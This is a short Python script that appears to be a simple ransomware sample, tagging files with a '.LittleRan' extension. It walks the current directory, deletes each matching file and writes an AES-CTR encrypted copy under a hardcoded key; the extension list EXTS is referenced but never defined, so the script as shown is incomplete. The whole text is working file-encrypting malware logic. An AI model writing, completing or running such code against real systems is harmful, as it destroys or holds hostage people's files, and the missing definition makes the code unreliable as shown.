import os
import pyaes

KEY = b"0984509889894532"

def encrypt(file_path):
    with open(file_path,"rb") as file:
        content = file.read()

        os.remove(file_path)
        aes = pyaes.AESModeOfOperationCTR(KEY)
        encrypted_data = aes.encrypt(content)

        new_file = "{}.LittleRan".format(file_path)

    with open(new_file, "wb") as file:
        file.write(encrypted_data)


system = os.walk(".")
for root, dirs, files in system:
    for file in files:
        file_path = os.path.join(root, file)
        if os.path.splitext(file)[1] in EXTS and os.path.basename(__file__) != file:
            encrypt(file_path)